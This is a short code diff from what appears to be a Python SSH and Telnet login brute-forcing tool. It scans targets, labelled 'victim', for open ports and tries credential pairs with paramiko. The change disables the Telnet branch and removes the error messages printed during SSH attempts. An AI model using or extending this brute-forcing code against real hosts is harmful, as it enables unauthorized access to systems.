@@ -65,8 +65,8 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
             elif ports[index] == 22:
                 sshBrute(target,db,hosts,monkeyId)
 
-            elif ports[index] == 23:
-                telBrute(target,db,hosts,monkeyId)
+            #elif ports[index] == 23:
+             #   telBrute(target,db,hosts,monkeyId)
 
 def sshBrute(victim,db,coll,monkeyId):
     startTime = time.ctime()
@@ -88,13 +88,9 @@ def sshBrute(victim,db,coll,monkeyId):
             ssh.connect(victim, 22, user, pwd)
 
         except paramiko.AuthenticationException, e:
-            print 'There was an SSH authentication exception'
-            print e
             pass
 
         except socket.error, e:
-            print 'There was an issue opening the socket'
-            print e
             pass
 
     endTime = time.ctime()
